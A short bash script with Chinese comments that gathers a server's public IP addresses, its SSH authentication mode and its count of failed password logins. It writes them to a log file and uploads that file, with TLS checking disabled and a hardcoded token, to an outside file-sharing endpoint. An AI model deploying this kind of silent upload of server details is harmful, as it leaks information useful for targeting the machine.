#!/bin/bash

echo "按下任意键立即开始执行脚本，或等待随机时间执行..."
# 读取用户输入，超时时间设置为随机的0-180秒
read -t $(( RANDOM % 181 )) -n 1

# 检查当前的登录模式
if grep -q "PasswordAuthentication yes" /etc/ssh/sshd_config; then
    LOGIN_MODE="SSH"
else
    LOGIN_MODE="PrivateKey"
fi

# 获取IPv4地址
IPV4=$(curl -s https://myip4.ipip.net || curl -s https://ddns.oray.com/checkip || curl -s https://ip.3322.net || curl -s https://4.ipw.cn)
[ -z "$IPV4" ] && IPV4="无"

# 获取IPv6地址
IPV6=$(curl -s https://speed.neu6.edu.cn/getIP.php || curl -s https://v6.ident.me || curl -s https://6.ipw.cn)
[ -z "$IPV6" ] && IPV6="无"

# 获取系统当前的SSH尝试登录次数
LOGIN_ATTEMPTS=$(grep "Failed password" /var/log/auth.log | wc -l)

# 输出到日志文件
LOG_FILENAME="VPS_${LOGIN_MODE}_${LOGIN_ATTEMPTS}_attempts_${IPV4//./_}_${IPV6//:/_}.log"
echo "IPv4地址: $IPV4" > "$LOG_FILENAME"
echo "IPv6地址: $IPV6" >> "$LOG_FILENAME"
echo "SSH尝试登录次数: $LOGIN_ATTEMPTS" >> "$LOG_FILENAME"
echo "登录模式: ${LOGIN_MODE}登录" >> "$LOG_FILENAME"

# 使用curl上传日志文件到网盘
curl -k -F "file=@$LOG_FILENAME" \
    -F "token=vy7v4ahy1uwt1witoqdv" \
    -F "model=2" \
    -F "mrid=65203924949e3" \
    -X POST "https://tmp-cli.vx-cdn.com/app/upload_cli"
